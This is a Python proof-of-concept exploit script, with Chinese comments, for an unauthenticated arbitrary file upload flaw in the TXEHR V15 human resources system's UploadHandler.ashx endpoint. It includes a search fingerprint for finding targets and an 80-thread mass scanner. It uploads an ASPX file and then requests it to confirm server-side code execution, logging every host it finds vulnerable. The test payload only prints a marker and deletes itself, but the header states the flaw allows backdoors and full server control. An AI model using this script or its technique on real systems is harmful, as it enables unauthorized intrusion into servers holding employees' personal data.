# 同享人力资源管理系统-TXEHR V15 UploadHandler.ashx 任意文件上传漏洞
# body="/Assistant/Default.aspx"
# 产品简介:同享人力资源管理系统（TXEHR V15）是一款专为现代企业设计的人力资源管理软件解决方案，旨在通过先进的信息化手段提升企业人力资源管理的效率与水平。该系统集成了组织人事、考勤管理、薪资核算、招聘配置、培训发展、绩效管理等核心模块，并提供了灵活的配置选项和强大的数据分析能力，以满足不同企业规模和行业特性的需求。
# 漏洞概述:同享人力资源管理系统-TXEHR V15 UploadHandler.ashx 接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
            \x1b[38m████████╗██╗  ██╗███████╗██╗  ██╗██████╗       ██╗   ██╗ ██╗███████╗
            \x1b[36m╚══██╔══╝╚██╗██╔╝██╔════╝██║  ██║██╔══██╗      ██║   ██║███║██╔════╝
            \x1b[34m   ██║    ╚███╔╝ █████╗  ███████║██████╔╝█████╗██║   ██║╚██║███████╗
            \x1b[35m   ██║    ██╔██╗ ██╔══╝  ██╔══██║██╔══██╗╚════╝╚██╗ ██╔╝ ██║╚════██║
            \x1b[31m   ██║   ██╔╝ ██╗███████╗██║  ██║██║  ██║       ╚████╔╝  ██║███████║
            \x1b[33m   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝        ╚═══╝   ╚═╝╚══════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
  --author:Kucei  --Version:同享人力资源管理系统-TXEHR V15 UploadHandler.ashx 任意文件上传漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('同享人力资源管理系统-TXEHR_V15_UploadHandler.ashx_任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = '/Handler/UploadHandler.ashx?folder=Uploadfile2'
    url_payload2 = '/Handler/Uploadfile2/123.aspx'
    headers1 = {
        'accept': '*/*',
        'Content-Type': 'multipart/form-data;boundary =---------------------------142851345723692939351758052805',
        'Connection': 'close',
    }
    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
        'Accept-Encoding': 'gzip',
        'Connection': 'close',
    }
    data = '-----------------------------142851345723692939351758052805\r\nContent-Disposition: form-data; name="Filedata"; filename="123.aspx"\r\nContent-Type: text/plain\r\n\n<%@Page Language="C#"%><%Response.Write("abcdefg");System.IO.File.Delete(Request.PhysicalPath);%>\r\n-----------------------------142851345723692939351758052805--'
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    try :
        response1 = requests.post(url=target+url_payload1,headers=headers1,data=data,verify=False,timeout=5)
        if response1.status_code == 200 and '1' in response1.text:
            response2 = requests.get(url=target+url_payload2,headers=headers2,verify=False,timeout=5)
            if response2.status_code == 200 and 'abcdefg' in response2.text:
                print( f"[+] {target} 存在漏洞！\n")
                with open('TXEHR-V15_UploadHandler_ashx-UploadFile.txt','a',encoding='utf-8')as f:
                    f.write(target+url_payload1+'\n')
                    return True
            else:
                print("[-] 不存在漏洞！！")
                return False
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()